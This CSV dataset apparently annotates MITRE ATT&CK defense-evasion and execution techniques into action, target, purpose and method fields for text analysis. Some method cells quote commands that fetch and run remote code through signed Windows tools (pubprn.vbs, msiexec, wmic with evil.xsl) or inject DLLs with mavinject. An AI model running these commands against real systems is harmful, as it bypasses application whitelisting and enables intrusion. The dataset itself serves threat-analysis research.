0,0,1,2,tactic,technique,Id,action_what,action_where,where_attribute,when,when_condition,when_object,why_state,why_what,why_where,how,how_what,how_where,precondition,postcondition,alternative_technique,
,,,617,"defense evasion,execution",signed script proxy execution,t1216,use,script,signed with trusted certificates,,,,"proxy <what>execution<\what> of malicious <where>files<\where> , <what>bypass<\what> <where>signature validation restrictions<\where> and <where>application whitelisting solutions<\where> ","execution , bypass","files , signature validation restrictions , application whitelisting solutions",,,,,,,
,,,618,"defense evasion,execution",signed script proxy execution,t1216,bypass,signature validation restriction,,,,,,,,,,,,,,
,,,619,"defense evasion,execution",signed script proxy execution,t1216,proxy execute,file,,,,,,,,,,,,,,
,,,620,"defense evasion,execution",signed script proxy execution,t1216,bypass,application whitelisting solution,,,,,,,,,,,,,,
,,,621,"defense evasion,execution",signed script proxy execution,t1216,use,pubprn.vbs,,,,,proxy <what>execution<\what> from a remote site,execution,,"cscript c[:]\windows\system32\printing_admin_scripts\en-us\pubprn[.]vbs 127.0.0.1  , script:http[:]//192.168.1.100/hi.png",,,,,,
,,,604,"defense evasion,execution",signed binary proxy execution,t1218,use,binary,microsoft signed ,,,,"proxy <what>execution<\what> of other <where>files<\where> , <what>execute<\what> malicious <where>files<\where> , <what>bypass<\what> <where>application whitelisting<\where> and <where>signature validation<\where> on systems","execution , execute , bypass","files , files , applicationwhitelisting , signature validation",,,,,,,
,,,605,"defense evasion,execution",signed binary proxy execution,t1218,proxy execute,file,,,,,,,,,,,,,,
,,,606,"defense evasion,execution",signed binary proxy execution,t1218,bypass,application whitelisting solution/signature validation restriction,,,,,,,,,,,,,,
,,,607,"defense evasion,execution",signed binary proxy execution,t1218,use,msiexec.exe,,,,,"<what>launch<\what> malicious <where>msi files<\where> , <where>code<\where> <what>execution<\what>","launch , execution","msi files , code","msiexec.exe /q /i c:\path\to\file.msi , msiexec.exe /q /i http[:]//site[.]com/file.msi , msiexec.exe /y c:\path\to\file.dll",,,,,,
,,,608,"defense evasion,execution",signed binary proxy execution,t1218,launch,file,maicious msi,,,,,,,"msiexec.exe /q /i c:\path\to\file.msi , msiexec.exe /q /i http[:]//site[.]com/file.msi , msiexec.exe /y c:\path\to\file.dll",,,,,,
,,,609,"defense evasion,execution",signed binary proxy execution,t1218,use,msiexec.exe,,,,,<what>launch<\what> local or network accessible <where>msi files<\where>,launch,msi files,"msiexec.exe /q /i c:\path\to\file.msi , msiexec.exe /q /i http[:]//site[.]com/file.msi , msiexec.exe /y c:\path\to\file.dll",,,,,,
,,,610,"defense evasion,execution",signed binary proxy execution,t1218,use,msiexec.exe,,,,,<what>execute<\what> <where>dlls<\where>,execute,dlls,"msiexec.exe /q /i c:\path\to\file.msi , msiexec.exe /q /i http[:]//site[.]com/file.msi , msiexec.exe /y c:\path\to\file.dll",,,,,,
,,,611,"defense evasion,execution",signed binary proxy execution,t1218,execute,DLL,,,,,,,,,,,,,,
,,,612,"defense evasion,execution",signed binary proxy execution,t1218,use,utility,mavinject,,,,<what>input<\what> a <where>dll<\where> into a running process,input,dll,"c:\program files\common files\microsoft shared\clicktorun\mavinject32.exe <pid> /injectrunning <path dll> , c:\windows\system32\mavinject.exe <pid> /injectrunning <path dll>",,,,,,
,,,613,"defense evasion,execution",signed binary proxy execution,t1218,input DLL,process,,,,,,,,,,,,,,
,,,614,"defense evasion,execution",signed binary proxy execution,t1218,use,utility,syncappvpublishingserver.exe,,,,<what>run<\what> <where>powershell scripts<\where> without executing powershell.exe,run,powershell scripts,,,,,,,
,,,615,"defense evasion,execution",signed binary proxy execution,t1218,run,powershell script,,,,,,,,,,,,,,
,,,616,"defense evasion,execution",signed binary proxy execution,t1218,use,utility,odbcconf.exe,,,,"<what>execute<\what> <where>functionality equivalent to regsvr32<\where> , <what>execute<\what> a <where>dll<\where>","execute , execute","functionality equivalent to regsvr32 , dll","regsvr option , odbcconf.exe /s /a {regsvr c:\users\public\file.dll}",,,,,,
,,,783,"defense evasion,execution",xsl script processing,t1220,"install , use",microsoft common line transformation utility binary  ,msxsl.exe,package it with dropped files,,,<what>execute<\what> <where>arbitrary files<\where>; <what>bypassing<\what> <where>application whitelisting defenses<\where>; <what>execute<\what> malicious <where>javascript<\where>,"execute , bypassing, execute","arbitrary files , application whitelisting defenses, javascript",msxsl.exe customers[.]xml script[.]xsl,use,msxsl.exe,,,,
,,,784,"defense evasion,execution",xsl script processing,t1220,execute, file,,,,,,,,using embedded script,,,,,,
,,,785,"defense evasion,execution",xsl script processing,t1220,bypass,application whitelisting defense,,,,,,,,,,,,,,
,,,786,"defense evasion,execution",xsl script processing,t1220,execute,javascript,,,,,,,,using msxsl.exe,,,,,,
,,,787,"defense evasion,execution",xsl script processing,t1220,use,windows management instrumentation,,,,,<what>invoke<\what> <where>jscript or vbscript<\where> within an <attribute>xsl file<\attribute>,invoke,jscript or vbscript,"regsvr32 , wmic process list /format:evil[.]xsl , wmic os get /format:https[:]//example[.]com/evil[.]xsl",,,,,,
,,,788,"defense evasion,execution",xsl script processing,t1220,invoke,jscript/vbscript,xsl file,,,,,,,,changing,extension,,,,
,,,789,"defense evasion,execution",xsl script processing,t1220,execute,script,,,,,<what>invoke<\what> <where>jscript or vbscript<\where> within an <attribute>xsl file<\attribute>,invoke,jscript or vbscript,"regsvr32 , wmic process list /format:evil[.]xsl , wmic os get /format:https[:]//example[.]com/evil[.]xsl",,,,,,
,,,790,"defense evasion,execution",xsl script processing,t1220,remote-execute,script,,,,,<what>invoke<\what> <where>jscript or vbscript<\where> within an <attribute>xsl file<\attribute>,invoke,jscript or vbscript,"regsvr32 , wmic process list /format:evil[.]xsl , wmic os get /format:https[:]//example[.]com/evil[.]xsl",,,,,,
,,,570,"defense evasion,execution ",scripting,t1064,use,script,,,,,<what>aid<\what> in operations<why> and <why><what>perform<\what> multiple actions that would otherwise be manual,"aid , perform",,,interacting,operating system,,,,
,,,571,"defense evasion,execution ",scripting,t1064,bypass,process monitoring mechanism,,,,,,,,,interacting,operating system,,,,
,,,572,"defense evasion,execution ",scripting,t1064,use, scripting language,,,,,<what>bypass<\what> <where>process monitoring mechanisms<\where>,bypass,process monitoring mechanisms,directly <what>interacting<\what> with the <where>operating system<\where> at an api level ,interacting,operating system,,,,
,,,573,"defense evasion,execution ",scripting,t1064,use,vbscript ,,,,,<what>bypass<\what> <where>process monitoring mechanisms<\where>,bypass,process monitoring mechanisms,directly <what>interacting<\what> with the <where>operating system<\where> at an api level ,use,powershell,,,,
,,,574,"defense evasion,execution ",scripting,t1064,use,powershell ,,,,,<what>bypass<\what> <where>process monitoring mechanisms<\where>,bypass,process monitoring mechanisms,directly <what>interacting<\what> with the <where>operating system<\where> at an api level ,,,,,,
,,,575,"defense evasion,execution ",scripting,t1064,use,command-line batch script,,,,,<what>bypass<\what> <where>process monitoring mechanisms<\where>,bypass,process monitoring mechanisms,directly <what>interacting<\what> with the <where>operating system<\where> at an api level ,,,,,,
,,,576,"defense evasion,execution ",scripting,t1064,embedd,script,office documents as macros," <condition><object>macros<\object> being allowed<\condition> , user will <condition>accept to activate <\condition>them","<object>macros<\object> being allowed , <object>macros<\object> being allowed , accept to activate ","macros , macros",,,,"exploitation for client execution , metasploit  , veil , powersploit  , <what>use<\what> <where>powershell<\where>",use,attributes,,,,
,,,316,"defense evasion,execution ",installutil,t1118,use,installutil,,,,,proxy <what>execution<\what> of <where>code<\where>,execution,code,trusted windows utility,,,,,,
,,,317,"defense evasion,execution ",installutil,t1118,proxy execute,code,,,,,,,,,,,,,,
,,,318,"defense evasion,execution ",installutil,t1118,use,installutil,,,,,<what>bypass<\what> <where>process whitelisting<\where>,bypass,process whitelisting,<what>use<\what> of <where>attributes<\where> within the binary,,,,,,
,,,319,"defense evasion,execution ",installutil,t1118,bypass,process whitelisting,,,,,,,,,,,,,,code signing
,,,726,"defense evasion,execution ",trusted developer utilities,t1127,use,msbuild,,,,,proxy execution of code,,,trusted windows utility,,,,,,
,,,727,"defense evasion,execution ",trusted developer utilities,t1127,use,dnx.exe,,,,,"proxy <what>execution<\what> of arbitrary <where>code<\where> , <what>bypass<\what> <where>application whitelist policies<\where>","execution , bypass","code , application whitelist policies",,,,,,,
,,,728,"defense evasion,execution ",trusted developer utilities,t1127,proxy execute,code/DLL,,,,,,,,,,,,,,
,,,729,"defense evasion,execution ",trusted developer utilities,t1127,bypass," application whitelist, whitelist policy, applocker  ",,,,,,,,,,,,,,
,,,730,"defense evasion,execution ",trusted developer utilities,t1127,use,rcsi.exe,,,,,"proxy <what>execution<\what> of arbitrary <where>code<\where> , <what>bypass<\what> <where>application whitelisting policies<\where>","execution , bypass","code , application whitelisting policies",,,,,,,
,,,731,"defense evasion,execution ",trusted developer utilities,t1127,use,windbg.exe,,,,,"proxy <what>execution<\what> of arbitrary <where>code<\where> , <what>bypass<\what> <where>application whitelist policies<\where>","execution , bypass","code , application whitelist policies",,,,,,,
,,,732,"defense evasion,execution ",trusted developer utilities,t1127,use,cdb.exe,,,,,"proxy <what>execution<\what> of arbitrary <where>code<\where> , <what>bypass<\what> <where>application whitelist policies<\where>","execution , bypass","code , application whitelist policies",,,,,,,
,,,733,"defense evasion,execution ",trusted developer utilities,t1127,use,tracker.exe,,,,,"proxy <what>execution<\what> of an arbitrary <where>dll<\where> into another <attribute>process<\attribute> , <what>bypass<\what> <where>application whitelisting solutions<\where>","execution , bypass","dll , application whitelisting solutions",,interacting,operating system,,,,
1,,,327,"defense evasion,execution,persistence",launchctl,t1152,use/install/load/reload/execute/launch/use/abuse,code/agent/deamon/launchctl,,,"allowed, granted","launchctl, elevated previleges",,"execute , bypass ","code , whitelisting",launchctl submit -l -- /path/to/thing/to/execute arg arg arg,,,,,,
,,,328,"defense evasion,execution,persistence",launchctl,t1152,bypass,whitelisting,,,,,,,,,,,,,,
,,,515,"defense evasion,persistence",redundant access,t1108,use,remote access tool,,,,,hedge against detection,,,<what>varying<\what> <where>command and control protocols<\where>,,,,,,
,,,516,"defense evasion,persistence",redundant access,t1108,use,Web Shell,,,,,<why><what>maintain<\what> <where>access<\where> to a network<\why> ,,,<how>externally accessible Web server<\how>,,,,,,
,,,517,"defense evasion,persistence",redundant access,t1108,gain access,valid account,,,,,"<what>use<\what> <where>external remote services<\where> such as external <where>vpns<\where>  , <what>maintain<\what> <where>access<\where> despite interruptions to remote access tools  ","use , maintain , maintain","external remote services , vpns , access , access",<what>use<\what> of a <where>web shell<\where>,,,,,,
,,,622,"defense evasion,persistence",sip and trust provider hijacking,t1198,use,sip and trust provider,,,,,"<what>subvert<\what> <where>trust controls<\where> , <what>bypass<\what> <where>security policies<\where>","subvert , bypass","trust controls , security policies",,,,,,,
,,,623,"defense evasion,persistence",sip and trust provider hijacking,t1198,bypass,security policy,,,,,,,,,,,,,,
,,,624,"defense evasion,persistence",sip and trust provider hijacking,t1198,hijack,sip,,,,,"<what>mislead<\what> <where>operating system<\where> and <where>whitelisting tools<\where> , <what>classify<\what> malicious (or any) <where>code<\where> as signed","mislead , classify","operating system , whitelisting tools , code",,,,,,,
